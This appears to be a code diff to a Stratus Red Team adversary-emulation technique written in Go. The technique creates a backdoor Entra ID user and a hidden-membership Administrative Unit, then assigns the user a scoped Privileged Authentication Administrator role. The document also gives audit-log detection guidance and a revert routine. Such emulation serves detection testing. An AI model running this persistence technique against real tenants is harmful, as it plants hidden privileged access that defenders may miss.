@@ -5,6 +5,7 @@ import (
 	_ "embed"
 	"errors"
 	"fmt"
+	"github.com/aws/smithy-go/ptr"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
 	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
@@ -20,7 +21,8 @@ func init() {
 		ID:           "entra-id.persistence.hidden-au",
 		FriendlyName: "Create Hidden Scoped Role Assignment Through HiddenMembership AU",
 		Description: `
-Create a HiddenMembership [Administrative Unit (AU)](https://learn.microsoft.com/en-us/graph/api/resources/administrativeunit?view=graph-rest-1.0), and a scoped role assignment over this AU to simulate hidden assigned permissions.
+Creates an [Administrative Unit (AU)](https://learn.microsoft.com/en-us/graph/api/resources/administrativeunit?view=graph-rest-1.0) with hidden membership, and a scoped role assignment over this AU.
+This simulates an attacker that TODO.
 
 Warm-up:
 
@@ -40,17 +42,14 @@ References:
 
 `,
 		Detection: `
-Identify the following <code>activityDisplayName</code> events in Entra ID Audit logs.
+Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the specific activity types:
 
-For <code>Service: Core Directory</code>,<code>Category: AdministrativeUnit</code>:
-Add administrative unit
-Add member to administrative unit
+For <code>Service: Core Directory</code> and <code>Category: AdministrativeUnit</code>:
+- <code>Add administrative unit</code>
+- <code>Add member to administrative unit</code>
 
-For <code>Service: Core Directory</code>,<code>Category: RoleManagement</code>:
-Add scoped member to role
-
-Consider detection of additional Administrative Unit activities and scoped role assignments in the following Microsoft article:
-- https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities
+For <code>Service: Core Directory</code> and <code>Category: RoleManagement</code>:
+- <code>Add scoped member to role</code>
 `,
 		Platform:                   stratus.EntraID,
 		IsIdempotent:               false,
@@ -74,24 +73,22 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	graphClient := providers.EntraId().GetGraphClient()
 
 	// 0. Create Backdoor User
+	log.Println("Creating backdoor user")
 	requestBodyUser := graphmodels.NewUser()
-	accountEnabled := true
-	requestBodyUser.SetAccountEnabled(&accountEnabled)
+	requestBodyUser.SetAccountEnabled(ptr.Bool(true))
 	displayName := fmt.Sprintf("Stratus Backdoor User - %s", suffix)
 	requestBodyUser.SetDisplayName(&displayName)
-	mailNickname := "StratusB"
-	requestBodyUser.SetMailNickname(&mailNickname)
+	requestBodyUser.SetMailNickname(ptr.String("StratusB"))
 	userPrincipalName := fmt.Sprintf("stratus-red-team-hidden-au-backdoor-%s@%s", suffix, domain)
 	requestBodyUser.SetUserPrincipalName(&userPrincipalName)
 	passwordProfile := graphmodels.NewPasswordProfile()
-	forceChangePasswordNextSignIn := true
-	passwordProfile.SetForceChangePasswordNextSignIn(&forceChangePasswordNextSignIn)
+	passwordProfile.SetForceChangePasswordNextSignIn(ptr.Bool(true))
+
 	// Using password from Terraform
 	passwordProfile.SetPassword(&password)
 	requestBodyUser.SetPasswordProfile(passwordProfile)
 
 	userResult, err := graphClient.Users().Post(context.Background(), requestBodyUser, nil)
-
 	if err != nil {
 		return errors.New("could not create backdoor user: " + err.Error())
 	}
@@ -99,9 +96,10 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	// 0.a. Save User ID from creation activity
 	backdoorUserId := *userResult.GetId()
 	backdoorPrincipalName := *userResult.GetUserPrincipalName()
-	log.Println("Created backdoor user " + backdoorPrincipalName)
+	log.Println("Backdoor user " + backdoorPrincipalName + " successfully created")
 
 	// 1. Create Hidden AU
+	log.Println("Creating Administrative Unit with hidden membership")
 	requestBodyAU := graphmodels.NewAdministrativeUnit()
 	displayNameAU := fmt.Sprintf("Stratus Hidden AU - %s", suffix)
 	requestBodyAU.SetDisplayName(&displayNameAU)
@@ -111,14 +109,13 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	requestBodyAU.SetVisibility(&visibility)
 
 	auResult, err := graphClient.Directory().AdministrativeUnits().Post(context.Background(), requestBodyAU, nil)
-
 	if err != nil {
 		return errors.New("could not create AU: " + err.Error())
 	}
 
 	// 1.a. Save AU ID from creation activity
 	auId := *auResult.GetId()
-	log.Println("Created HiddenMembership AU " + auId)
+	log.Println("Successfully created Administrative Unit with ID " + auId)
 
 	// 2. Add Target member to Hidden AU
 	requestBodyMember := graphmodels.NewReferenceCreate()
@@ -136,16 +133,14 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	roleDefinitionId := roleId
 	requestBodyRole.SetRoleDefinitionId(&roleDefinitionId)
 	requestBodyRole.SetPrincipalId(&backdoorUserId)
-	directoryScopeId := ("/administrativeUnits/" + auId)
+	directoryScopeId := "/administrativeUnits/" + auId
 	requestBodyRole.SetDirectoryScopeId(&directoryScopeId)
 
+	log.Println("Assigning Privileged Authentication Administrator role to backdoor user " + backdoorPrincipalName + " over AU")
 	_, err = graphClient.RoleManagement().Directory().RoleAssignments().Post(context.Background(), requestBodyRole, nil)
-
 	if err != nil {
 		return errors.New("could not assign role: " + err.Error())
 	}
-
-	log.Println("Assigned PAA scoped role to backdoor user " + backdoorPrincipalName)
 
 	return nil
 }
@@ -163,15 +158,18 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	}
 
 	var auId string
+	var auName string
 	for _, au := range auResult.GetValue() {
-		auName := *au.GetDisplayName()
-		if strings.HasSuffix(auName, suffix) {
+		candidateAuName := *au.GetDisplayName()
+		if strings.HasSuffix(candidateAuName, suffix) {
 			auId = *au.GetId()
+			auName = candidateAuName
 			break
 		}
 	}
 
 	// 2. Delete Hidden AU
+	log.Println("Deleting Administrative Unit with hidden membership " + auName)
 	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)
 	if err != nil {
 		return errors.New("could not delete AU: " + err.Error())
@@ -193,6 +191,7 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	}
 
 	// 4. Delete backdoor user
+	log.Println("Deleting backdoor user")
 	err = graphClient.Users().ByUserId(userId).Delete(context.Background(), nil)
 	if err != nil {
 		return errors.New("could not delete backdoor user: " + err.Error())
